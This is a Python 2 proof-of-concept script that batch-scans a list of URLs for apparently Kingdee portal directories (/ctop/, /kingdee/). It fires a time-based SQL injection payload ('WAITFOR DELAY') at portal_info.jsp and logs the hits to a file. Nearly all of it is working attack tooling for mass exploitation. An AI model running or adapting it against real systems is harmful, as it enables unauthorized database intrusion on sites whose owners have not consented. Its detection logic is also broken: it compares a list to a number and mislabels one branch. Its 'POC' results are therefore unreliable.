#!/usr/bin/python
# coding: UTF-8

import StringIO
import pycurl
import sys
import os
import time


class Test:

    def __init__(self):
        self.contents = ''

    def body_callback(self, buf):
        self.contents = self.contents + buf


def test_gzip(input_url):

    t = Test()
    # gzip_test= file("gzip_test.txt", 'w')
    c = pycurl.Curl()
    c.setopt(pycurl.CONNECTTIMEOUT, 5)
    c.setopt(pycurl.WRITEFUNCTION, t.body_callback)
    c.setopt(pycurl.ENCODING, 'gzip')
    c.setopt(pycurl.URL, input_url)
    c.perform()
    http_code = c.getinfo(pycurl.HTTP_CODE)
    http_conn_time = c.getinfo(pycurl.CONNECT_TIME)
    http_pre_tran = c.getinfo(pycurl.PRETRANSFER_TIME)
    http_start_tran = c.getinfo(pycurl.STARTTRANSFER_TIME)
    http_total_time = c.getinfo(pycurl.TOTAL_TIME)
    http_size = c.getinfo(pycurl.SIZE_DOWNLOAD)
    print 'http_code http_size conn_time pre_tran start_tran total_time'
    print "%d %d %f %f %f %f" % (http_code, http_size, http_conn_time, http_pre_tran, http_start_tran, http_total_time)

    return_list = [http_code, http_size, http_conn_time,
                   http_pre_tran, http_start_tran, http_total_time]
    return return_list


if __name__ == '__main__':
    # input_url = sys.argv[1]

    source = raw_input("source url list > ")
    url_list = open(source, 'r')
    ans_list = open(source + '_POCed', 'w')
    for url in url_list.readlines():
        try:
            ans_url = url.replace("\n", "")
            ans_message = '\n' + url
            payload = ''

            if test_gzip(ans_url + '/ctop/')[0] == 200:
                print '[OK] dir:ctop found !'
                ans_message += '[OK] dir:ctop found !\n'
                payload = ans_url + "/ctop/portal/portal_info.jsp?id=1;WAITFOR DELAY '0:0:1'--"
            elif test_gzip(ans_url + '/kingdee/')[0] == 200:
                print '[OK] dir:kingdee found !'
                ans_message += '[OK] dir:ctop found !\n'
                payload = ans_url + "/kingdee/portal/portal_info.jsp?id=1;WAITFOR DELAY '0:0:1'--"
            else:
                print '[*]both /ctop/ /kingdee/ return 404 !'
                ans_message += '[*]both /ctop/ /kingdee/ return 404 !\n'
                ans_list.write(ans_message)
                continue

            _payload = test_gzip(payload)
            time.sleep(1)
            if _payload > 1:
                print 'POC !'
                ans_message += '[*]payload found:\n'
                ans_message += payload + '\n'

            ans_list.write(ans_message)
        except:
            pass
    url_list.close()
    ans_list.close()
